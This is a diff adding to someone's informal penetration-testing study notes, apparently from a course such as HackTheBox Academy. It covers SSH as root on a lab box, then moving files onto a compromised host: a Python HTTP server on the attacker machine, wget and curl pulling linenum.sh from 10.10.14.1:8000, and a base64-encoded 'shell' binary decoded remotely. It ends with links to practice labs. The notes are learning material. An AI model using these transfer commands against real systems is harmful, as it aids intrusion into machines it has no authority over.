@@ -564,6 +564,51 @@ $ls -lA / (need to know that they can access the root directory because it is mi
 -> $netstat -antpl
 -Before attempting to connect to port 80, students can grab the banner of the service running using nc, finding it to be SSH (students can use Ctrl + c to exit from the connection):
 -> $nc localhost 80 -> ssh as the root user via port 80
--> ssh -i id_rsa root@localhost -p 80  -> Y ->cat flag.txt
-
-
+-> ssh -i id_rsa root@localhost -p 80  -> Y ->cat ~/flag.txt
+\\\\Transfering Files===============================================
+in pentest we will need to trans files to rhe remote server, such as enum scripts or exploits, or trans data back to our atk host
+-while tools like metaspoit with a meterpreter shell allow us to use the upload command to upload file, 
+\\Using wget
+-one way is Python HTTP server on our machine and then using wget or cURL to download the file on the remote host
+->first we go into the dir that contains the file we need to trans and run a python http server in it
+$cd /tmp  -> $python3 -m http.server 8000
+-Now we have setup a listening server on our machine, we can download the file on the remote host that we have code execution on
+$wget http://10.10.14.1:8000/linenum.sh
+-Now that used our ip 10.10.14.1 and port our python server on 8000. if the remote server does not have wget use curl to download it
+$curl http://10.10.14.1:8000/linenum.sh -o lunenum.sh
+\\Using SCP
+-granted we have obtained ssh user credentials on remote host
+$scp linenum.sh user@remotehost:/tmp/linenum.sh
+- we specified the local file name after scp, and the remote dir will be saved to after the:.
+\\Using Base64
+-stm we not able to trans the file. ex the remote host may have firewall protections that prevent us from downloading
+-use simple trick to base64 encode the file into base64 format,
+-> paste the base64 string on the remote server and decode it. 
+EX: transfer a binary file called shell, we can base64 encode it 
+$base64 shell -w 0  <result>f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
+->copy this base64 string, goto the remote host, and use base64 -d to decode it, and pipe the output into a file
+$echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
+\\validating File Transfers
+run file command on it
+$file shell <result>shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
+-> it say that it is an ELF binary meaning successfully trans 
+-> check md5 hash to ensure the file dont Broken
+$md5sum shell
+\\\\Starting out============================
+\\Vulnerable machine/app
+https://owasp.org/www-project-juice-shop/
+https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/
+https://github.com/rapid7/metasploitable3
+https://github.com/digininja/DVWA
+\\youtube 
+https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA
+https://www.youtube.com/channel/UCpoyhjwNIWZmsiKNKpsMAQQ
+https://www.youtube.com/channel/UCQN2DsjnYH60SFBIA6IkNwg
+\\blog
+https://0xdf.gitlab.io/
+\\tutorial web
+https://underthewire.tech/wargames
+https://overthewire.org/wargames/
+\\
+https://app.hackthebox.eu/battlegrounds/lobby
+/machine /challgenges /tracks
